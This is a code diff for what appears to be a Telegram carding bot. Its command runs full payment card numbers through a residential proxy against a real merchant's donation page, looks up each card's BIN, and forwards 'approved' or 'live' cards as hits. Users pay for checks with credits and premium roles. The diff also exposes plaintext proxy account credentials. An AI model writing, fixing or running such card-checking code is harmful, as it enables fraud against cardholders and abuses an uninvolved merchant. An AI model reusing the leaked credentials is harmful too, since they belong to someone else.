@@ -17,8 +17,7 @@ async def cmd_ho(client, message):
 
         regdata = fetchinfo(user_id)
         if not regdata:
-            insert_reg_data(user_id, username, 0, str(date.today()))
-            regdata = fetchinfo(user_id)
+            return await message.reply_text("❌ You are not registered. Use /register first.")
 
         role = regdata[2] or "FREE"
         credit = int(regdata[5] or 0)
@@ -27,10 +26,10 @@ async def cmd_ho(client, message):
         now = int(time.time())
 
         GROUP = open("plugins/group.txt").read().splitlines()
-        if chat_type == "ChatType.PRIVATE" and role == "FREE":
+        if chat_type == "ChatType.PRIVATE" and role.upper() == "FREE":
             return await message.reply_text(
                 "Premium Users Required ⚠️\n"
-                "Only Premium Users can use this in PM.\n"
+                "Only Premium Users can use this command in bot PM.\n"
                 "Join group for free use:",
                 reply_markup=InlineKeyboardMarkup(
                     [[InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]]
@@ -43,7 +42,6 @@ async def cmd_ho(client, message):
 
         if credit < 1:
             return await message.reply_text("❌ Insufficient credit.")
-
         if now - antispam_time < wait_time:
             return await message.reply_text(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s")
 
@@ -79,7 +77,7 @@ async def cmd_ho(client, message):
                 "card": fullcc,
                 "product_url": "https://cowdengarden.com/products/donation",
                 "email": None,
-                "proxy": "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t",
+                "proxy": "proxy.geonode.io:9000:geonode_PmcmU0FNP2-type-residential:250868f4-26b6-4a5c-a39a-22a7e2929624",
                 "ship_address": None,
                 "is_shippable": False
             }
@@ -104,7 +102,6 @@ async def cmd_ho(client, message):
 
         toc = time.perf_counter()
 
-        # BIN Lookup using your existing code (VOIDEX)
         try:
             binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", timeout=10).json()
             brand = binres.get("brand") or binres.get("scheme") or "UNKNOWN"
@@ -134,8 +131,10 @@ async def cmd_ho(client, message):
 <b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
 """
 
-        await send_hit_if_approved(client, final_msg)
         await client.edit_message_text(chat_id, check_msg.id, final_msg)
+
+        if "approved" in status.lower() or "live" in card_message.lower():
+            await send_hit_if_approved(client, final_msg)
 
         updatedata(user_id, "credits", credit - 1)
         updatedata(user_id, "antispam_time", now)
